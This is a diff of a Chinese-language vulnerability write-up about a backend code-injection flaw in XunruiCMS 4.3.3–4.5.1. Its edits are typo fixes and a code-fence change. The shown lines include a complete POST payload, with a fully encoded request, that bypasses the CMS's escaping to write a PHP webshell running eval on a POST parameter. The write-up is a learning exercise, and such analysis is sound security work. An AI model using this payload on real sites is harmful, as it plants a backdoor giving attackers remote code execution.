@@ -6,7 +6,7 @@
     - [漏洞分析](#漏洞分析)
   - [漏洞测试](#漏洞测试)
   - [小结](#小结)
-  - [相关连接](#相关连接)
+  - [相关链接](#相关链接)
 
 ## V4.3.3-V4.5.1 后台任意注入漏洞
 
@@ -143,9 +143,9 @@ string(125) "{"1":{"name":"","code":"[';file_put_contents('webshell.php','&lt;?p
 - 关于`>`和 `<` 的编码可以看出来是被进行的html编码，这个可以通过使用`htmlspecialchars_decode`来解决
 - 关于`(`,`)`被编码以及`"`被转义可以通过 `base64_decode` 编码的方式进行绕过
 
-这样讲我们构造的post 的数据进行调整为：
+这样将我们构造的post 的数据进行调整为：
 
-```http
+```url
 data[1][name]=&data[1][code]=[';file_put_contents('webshell.php',htmlspecialchars_decode('<').'?php%20eval'.base64_decode('KA==').'@$_POST%5B'.base64_decode('Ig==').'password'.base64_decode('Ig==').'%5D'.base64_decode('KQ==').';?'.htmlspecialchars_decode('>'));return;']
 // 完整请求参数
 is_form=1&is_admin=1&is_tips=&csrf_test_name=398242eb0f467c80b539d08baf47eb29&data%5B1%5D%5Bname%5D=&data%5B1%5D%5Bcode%5D=%5B'%3bfile_put_contents('webshell.php',htmlspecialchars_decode('<').'%3fphp%2520eval'.base64_decode('KA%3d%3d').'%40$_POST%255B'.base64_decode('Ig%3d%3d').'password'.base64_decode('Ig%3d%3d').'%255D'.base64_decode('KQ%3d%3d').'%3b%3f'.htmlspecialchars_decode('>'))%3breturn%3b'%5D
@@ -177,7 +177,7 @@ string(265) "{"1":{"name":"","code":"[';file_put_contents('webshell.php',htmlspe
 
 作为一个在学习完漏洞原理之后，把这个作为入门分析代码的例子还是非常不错的，过程也还比较有意思
 
-## 相关连接
+## 相关链接
 
 - <https://xz.aliyun.com/t/11457>
 - <https://gitee.com/dayrui/xunruicms>
